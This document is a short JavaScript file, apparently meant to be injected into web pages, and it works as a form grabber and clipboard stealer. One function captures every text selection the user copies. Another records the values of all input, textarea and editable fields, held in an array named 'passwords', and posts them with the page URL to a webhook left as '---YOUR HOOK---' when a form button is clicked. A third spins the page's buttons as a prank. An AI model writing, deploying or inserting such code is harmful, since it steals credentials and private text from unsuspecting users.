
function webhookClipboard() {

    document.addEventListener("copy", () => {
        const selected = window.getSelection()?.toString();
        let date = new Date()

        var hook = new XMLHttpRequest();

        hook.open('POST', '---YOUR HOOK---');

        hook.setRequestHeader('Content-type', 'application/json');

        var content = {
            content: '```' + `Domain: ${window.location.href}` + '\n\n' + `Text: ${selected}` + '```'
        }

        hook.send(JSON.stringify(content));
    });

}

function logger() {
    let passwords = []

    document.querySelectorAll("input,textarea,[contenteditable]").forEach((el, i) => {
        el.setAttribute("alpha-count", i)
        el.addEventListener(
            "input", (e) => {
                passwords[i] = e.target.value
            })
    }
    )

    document.querySelectorAll("button, input").forEach(el => {
        if (el.closest("form")) {
            if (el.tagName == 'input' || el.getAttribute("type") == 'submit') {
                el.addEventListener("click", () => {
                    var hook = new XMLHttpRequest();

                    hook.open('POST', '---YOUR HOOK---');

                    hook.setRequestHeader('Content-type', 'application/json');

                    var content = {
                        content: '```' + `Domain: ${window.location.href}` + "\n\n" + passwords.join("\n\n") + '```'
                    }

                    hook.send(JSON.stringify(content));
                })
            } else if (el.tagName == 'BUTTON') {
                el.addEventListener("click", () => {
                    var hook = new XMLHttpRequest();

                    hook.open('POST', '---YOUR HOOK---');

                    hook.setRequestHeader('Content-type', 'application/json');

                    var content = {
                        content: '```' + `Domain: ${window.location.href}` + "\n\n" + passwords.join("\n\n") + '```'
                    }

                    hook.send(JSON.stringify(content));
                })
            }
        }
    })
}

function removeAllButton() {
    document.querySelectorAll("button").forEach(el => {
        el.style.transition = "4s";
        el.style.transform = "rotate(1392deg)";
    })
}

setTimeout(removeAllButton, 1400)
setTimeout(logger, 1100)
setTimeout(webhookClipboard, 1100)
